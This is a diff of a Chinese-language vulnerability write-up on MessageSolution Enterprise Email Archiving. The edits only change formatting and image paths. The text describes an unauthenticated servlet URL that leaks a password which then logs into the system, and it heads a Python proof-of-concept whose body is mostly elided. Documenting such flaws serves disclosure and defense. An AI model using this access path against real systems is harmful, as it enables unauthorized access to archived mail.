@@ -20,35 +20,21 @@ title="MessageSolution Enterprise Email Archiving (EEA)"
 
 登录页面如下
 
-
-
-![](images/202202102006003.png)
+![](../.gitbook/assets/202202102006003.png)
 
 访问如下Url
 
-
-
-```plain
+```
 http://xxx.xxx.xxx.xxx/authenticationserverservlet/
 ```
 
-
-
-![](images/202202102006561.png)
-
-
+![](../.gitbook/assets/202202102006561.png)
 
 使用获得到的密码可以登录系统
 
-
-
-![](images/202202102006711.png)
-
-
+![](../.gitbook/assets/202202102006711.png)
 
 ## 漏洞POC
-
-
 
 ```python
 import requests
@@ -92,8 +78,6 @@ if __name__ == "__main__":
     POC_1(target_url)
 ```
 
+![](C:%5CUsers%5C47236%5CDesktop%5C4.png)
 
-
-![](C:\Users\47236\Desktop\4.png)
-
-## 
+##
